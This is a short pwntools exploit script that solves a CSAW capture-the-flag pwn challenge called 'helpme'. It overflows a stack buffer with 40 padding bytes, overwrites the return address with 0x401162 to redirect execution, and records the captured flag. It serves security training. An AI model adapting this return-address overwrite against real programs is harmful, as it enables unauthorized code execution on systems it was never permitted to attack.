#!/usr/bin/env python3

from pwn import *

exe = ELF("helpme")

context.binary = exe


def conn():
	if False:
		return process([exe.path])
	else:
		return remote("pwn.red.csaw.io", 5002)


def main():
	r = conn()
	r.recvuntil("> ")
	r.sendline("a"*40 + "\x62\x11\x40\x00\x00\x00\x00\x00") #0x0000000000401162
	r.interactive()


if __name__ == "__main__":
	main()

# Flag: flag{U_g07_5h311!_wh4t_A_h4xor!}
# 1 hr in
